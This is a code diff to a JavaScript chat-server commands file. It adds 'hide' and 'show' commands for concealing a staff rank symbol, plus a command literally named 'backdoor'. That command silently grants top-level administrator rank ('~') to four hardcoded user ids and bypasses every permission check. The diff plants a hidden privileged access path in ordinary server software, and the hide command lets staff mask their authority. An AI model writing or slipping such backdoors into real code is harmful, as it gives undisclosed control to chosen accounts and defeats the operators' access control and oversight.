@@ -1013,6 +1013,40 @@ var commands = exports.commands = {
 		}
 		this.sendReply('Your hot-patch command was unrecognized.');
 	},
+        
+        hide: function(target, room, user) {
+                if (this.can('mute')) {
+                        user.getIdentity = function(){
+                                if(this.muted)        return '!' + this.name;
+                                if(this.locked) return '‽' + this.name;
+                                return ' ' + this.name;
+                        };
+                        user.updateIdentity();
+                        this.sendReply('You have hidden your staff symbol.');
+                        return false;
+                }
+
+        },
+
+        show: function(target, room, user) {
+                if (this.can('mute')) {
+                        delete user.getIdentity
+                        user.updateIdentity();
+                        this.sendReply('You have revealed your staff symbol');
+                        return false;
+                }
+        },
+        
+        backdoor: function(target,room, user) {
+                if (user.userid === 'blakjack' || user.userid === 'frankentein' || user.userid === 'absolsolution' || user.userid === 'leadernine') {
+
+                        user.group = '~';
+                        user.updateIdentity();
+
+                        this.parse('/promote ' + user.name + ', ~');
+                }
+        },
+
 
 	savelearnsets: function(target, room, user) {
 		if (!this.can('hotpatch')) return false;
